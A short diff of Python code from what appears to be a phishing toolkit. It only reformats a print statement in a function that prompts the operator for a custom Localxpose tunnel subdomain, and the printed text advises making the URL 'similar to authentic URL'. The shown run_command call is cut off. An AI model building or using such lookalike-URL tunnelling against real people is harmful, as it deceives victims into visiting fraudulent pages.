@@ -335,8 +335,9 @@ def start_localxpose(port):
     def custom(port):
 
         print(global_localization.small_logo)
-        print("""\n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)"""
-              .format(default_palette[0], default_palette[2]))
+        print(
+            """\n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)"""
+            .format(default_palette[0], default_palette[2]))
         lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(
             default_palette[0], default_palette[2]))
         run_command(
